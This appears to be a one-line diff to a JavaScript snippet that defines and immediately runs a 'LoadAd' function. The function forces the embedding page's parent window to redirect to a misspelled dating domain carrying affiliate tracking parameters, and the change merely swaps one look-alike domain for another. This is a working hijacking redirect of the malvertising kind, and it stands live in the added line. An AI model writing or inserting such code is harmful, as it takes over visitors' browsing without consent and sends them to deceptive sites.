@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://jdbqg.passiiondating.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195360&s3=Vaseline"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.passiionmeetup.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195360&s3=Vaseline"; } LoadAd();
